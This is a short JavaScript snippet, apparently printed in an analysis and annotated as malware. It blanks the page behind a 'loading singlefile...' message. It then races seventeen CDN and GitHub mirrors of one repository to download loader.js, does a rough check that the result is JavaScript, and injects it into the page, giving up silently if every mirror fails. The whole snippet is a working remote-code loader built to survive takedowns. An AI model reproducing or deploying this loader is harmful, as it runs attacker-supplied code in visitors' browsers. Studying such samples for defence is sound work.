body.script:
(async () => {
  // Replace the page with a loading message
  document.body.style.cssText =
    "background:#000;color:#fff;margin:0;height:100vh;" +
    "display:flex;justify-content:center;align-items:center;" +
    "font-family:sans-serif;font-size:1.5rem;";
  document.body.textContent = "loading singlefile...";

  // Multiple mirrors of the same malware repository
  const bases = [
    "https://cdn.jsdelivr.net/gh/TongSherbet/im-single/",
    "https://quantil.jsdelivr.net/gh/TongSherbet/im-single/",
    "https://fastly.jsdelivr.net/gh/TongSherbet/im-single/",
    "https://testingcf.jsdelivr.net/gh/TongSherbet/im-single/",
    "https://gcore.jsdelivr.net/gh/TongSherbet/im-single/",
    "https://originfastly.jsdelivr.net/gh/TongSherbet/im-single/",
    "https://jsdelivr.b-cdn.net/gh/TongSherbet/im-single/",
    "https://cdn.statically.io/gh/TongSherbet/im-single@main/",
    "https://rawcdn.githack.com/TongSherbet/im-single/main/",
    "https://raw.githack.com/TongSherbet/im-single/main/",
    "https://cdn.staticdelivr.com/gh/TongSherbet/im-single/main/",
    "https://raw.githubusercontent.com/TongSherbet/im-single/main/",
    "https://github.com/TongSherbet/im-single/blob/main/",
    "https://git.yylx.win/github.com/TongSherbet/im-single/blob/main/",
    "https://fastgit.cc/https://github.com/TongSherbet/im-single/blob/main/",
    "https://raw.esm.sh/gh/TongSherbet/im-single/",
    "https://esm.sh/gh/TongSherbet/im-single/"
  ];

  // Basic check that the response looks like JavaScript
  function validateJs(txt) {
    if (!txt || txt.length < 200 || txt.trim().startsWith("<")) return false;
    const open  = (txt.match(/[{[(]/g) || []).length;
    const close = (txt.match(/[}\])]/g) || []).length;
    const hasKeywords = /\b(function|const|let|var|async|await|if|return)\b/.test(txt);
    return hasKeywords && Math.abs(open - close) <= 3;
  }

  const controller = new AbortController();

  const fetchScript = async (base) => {
    const url = `${base}loader.js?raw&${Math.floor(Date.now() / 3600000)}`;
    const res = await fetch(url, { signal: controller.signal });
    if (!res.ok) throw 0;
    const txt = await res.text();
    if (!validateJs(txt)) throw 0;
    return { base, txt };
  };

  try {
    // Race all mirrors – first one that succeeds wins
    const { base, txt } = await Promise.any(bases.map(fetchScript));
    controller.abort();               // cancel remaining requests
    window.RELAY_DOMAIN = base;       // remember which mirror worked

    // Inject the downloaded malware
    const script = document.createElement("script");
    script.textContent = txt;
    document.head.appendChild(script);
  } catch {
    // All mirrors failed – silently do nothing
  }
})();
